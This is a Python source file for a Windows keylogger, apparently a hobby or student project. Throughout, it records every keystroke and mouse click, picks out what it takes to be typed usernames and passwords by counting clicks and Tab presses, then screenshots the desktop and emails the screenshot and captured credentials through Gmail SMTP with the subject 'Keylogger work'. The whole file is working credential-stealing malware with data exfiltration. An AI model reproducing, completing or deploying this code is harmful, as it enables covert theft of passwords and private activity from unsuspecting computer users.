'''
Name 1:Mor

'''

import pynput
from pynput.mouse import Listener as Mouse
from pynput.keyboard import Listener as Keyboard
import os
import win32api,win32con
import smtplib
import pyautogui
import imghdr
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


f = open("log1.txt", "w")
ps = open("passandname.txt", "w")

tab=False
flagClick=False
flagPress=False
count=0
space=0
countCopy=0

def on_press(key):
    global flagPress,flagClick,count
    flagPress=True
    if flagClick ==True:
        count+=1
        flagClick=False
    with open('log1.txt', 'a') as f:
        cap_cheack=(win32api.GetKeyState(win32con.VK_CAPITAL))
        key = str(key).replace("'", "")
        WithEnterAndTab(key,cap_cheack)
        f.write(filter(key,cap_cheack))

def on_click(x, y, button, pressed):
    with open('log1.txt', 'a') as click:
        if pressed:
            global flagClick,count,flagPress
            flagClick=True
            if flagPress ==True:
                count+=1
                flagPress=False
            click.write('\n Mouse clicked at ({0}, {1}) with {2}\n'.format(x, y, button))

def WithEnterAndTab(key,cap_cheack):
    global flagClick,flagPress,count,space,tab,countCopy
    if key=="Key.tab":
        tab=True

    '''Ctrl C +Ctrl V '''
    if (key=="\\x03" and countCopy==0) or (key=="\\x16" and countCopy==1):
        countCopy+=1
             
    # ------------------------------------------ USER NAME
    stri=''
    if count==1 and tab==False :
        if key.find("Key") == -1:
            stri= filter(key,cap_cheack)
            with open('passandname.txt', 'a') as ps:
                ps.write(stri)
    
    # ------------------------------------------ password
    if count==3 or (tab==True and count==1):

        if space==0:
            space=1
            stri = filter("Key.space", cap_cheack)
            with open('passandname.txt', 'a') as ps:
                ps.write(stri)
        if key.find("Key") == -1:
            stri = filter(key, cap_cheack)
            with open('passandname.txt', 'a') as ps:
                ps.write(stri)

    if (key == "Key.enter" and count == 3) or (key == "Key.enter" and count == 1 and tab== True) or (countCopy==2) :
        send_mail()
        flagPress=False
        flagClick=False
        tab=False
        count=0
        space=0
        countCopy=0
        ps = open("passandname.txt", "w")
    if (key == "Key.enter" and count != 3) or (key == "Key.enter" and( count != 1 or tab == False)) :
        flagPress=False
        flagClick=False
        count=0
        space=0
        countCopy=0
        tab=False
        ps = open("passandname.txt", "w")



def filter(ke,cap):
    if ke =="<96>":
        return "0";
    if ke =="<97>":
        return "1";
    if ke =="<98>":
        return "2";
    if ke =="<99>":
        return "3";
    if ke =="<100>":
        return "4";
    if ke =="<101>":
        return "5";
    if ke =="<102>":
        return "6";
    if ke =="<103>":
        return "7";
    if ke =="<104>":
        return "8";
    if ke =="<105>":
        return "9";
    if ke == "Key.space":
        return " "
    elif ke == "Key.enter":
        return "\n"
    elif ke == "Key.backspace":
        with open('log1.txt', 'rb+') as filehandle:
            filehandle.seek(-1, os.SEEK_END)
            filehandle.truncate()
            return ""
    elif ke == "Key.caps_lock" or ke == "Key.shift":
        return ""
    elif ke == "Key.esc":
        return False
    elif ke =="<110>":
        return "."
    elif ke.find("Key") != -1:
        return "\n" + ke + "\n"
    else:
        if cap == 1:
            return ke.upper()
        else:
            return ke

def send_mail():

    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'C:\Users\ADMIN\Desktop\screenshot_1.png')
    Sender_Email = "email@.com"
    Reciever_Email = "email@.com"
    Password = ('Email password')

    newMessage = EmailMessage()                         
    newMessage['Subject'] = "Keylogger work" 
    newMessage['From'] = Sender_Email                   
    newMessage['To'] = Reciever_Email                   
    newMessage.set_content('we did it!!!!') 

    with open('screenshot_1.png', 'rb') as image:
        image_data = image.read()
        image_type = imghdr.what(image.name)
        image_name = image.name

  
    newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)
    if countCopy != 2:
        newMessage.add_attachment(open("passandname.txt", "r").read(), filename="passandname.txt")




    try:
       with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(Sender_Email, Password)              
        smtp.send_message(newMessage)
        smtp.close()
        print ("Email sent successfully!")
        remove_img(r'C:\Users\ADMIN\Desktop', 'screenshot_1.png')
    except Exception as ex:
        print ("Something went wrong….",ex)



def remove_img(path, img_name):
    os.remove(path + '/' + img_name)
# check if file exists or not
    if os.path.exists(path + '/' + img_name) is False:
        # file did not exists
        return True

keyboard_listener = Keyboard(on_press=on_press)
mouse_listener = Mouse(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()